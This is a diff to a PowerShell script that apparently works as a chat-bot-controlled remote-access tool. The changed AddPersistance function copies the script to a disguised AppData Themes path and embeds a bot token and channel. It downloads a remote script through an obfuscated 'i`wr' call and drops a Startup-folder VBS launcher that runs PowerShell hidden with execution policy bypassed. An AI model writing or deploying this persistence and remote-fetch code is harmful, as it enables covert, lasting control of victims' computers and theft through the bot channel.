@@ -21,20 +21,6 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 
-# detect run type
-$detect = $MyInvocation.MyCommand.Path
-$detectContent = Get-Content -Path $detect
-if ($detectContent.Length -gt 1) {
-    $ScriptPath = $MyInvocation.MyCommand.Path
-    $ScriptContent = Get-Content -Path $ScriptPath
-    Write-Host "script is running from PS File"
-}
-else{
-    $ScriptPath = $MyInvocation.PSCommandPath
-    $ScriptContent = Get-Content -Path $ScriptPath
-    Write-Host "script is running from Invoke-Expression"
-}  
-
 # =============================================================== MODULE FUNCTIONS =========================================================================
 
 # --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------
@@ -720,23 +706,23 @@ Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -Assemb
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance{
-    $OutputPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+    $scriptContent | Out-File -FilePath $newScriptPath -force
     sleep 1
-    if ($OutputPath.Length -lt 100){
-        "`$tk = `"$token`"" | Out-File -FilePath $OutputPath -Force -Append
-        "`$ch = `"$chan`"" | Out-File -FilePath $OutputPath -Force -Append
-        $ScriptContent | Out-File $OutputPath -Append
+    if ($newScriptPath.Length -lt 100){
+        "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
+        "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
+        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
         sleep 1
-        $scriptFile = Get-Item $OutputPath
-        $hiddenAttribute = [System.IO.FileAttributes]::Hidden
-        $scriptFile.Attributes = ($hiddenAttribute -bor $scriptFile.Attributes)
-    }
+        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+        }
     $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
 '@
     $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
+    rm -path "$env:TEMP\temp.ps1" -Force
     sendMsg -Message ":white_check_mark: ``Persistance Added!`` :white_check_mark:"
 }
 
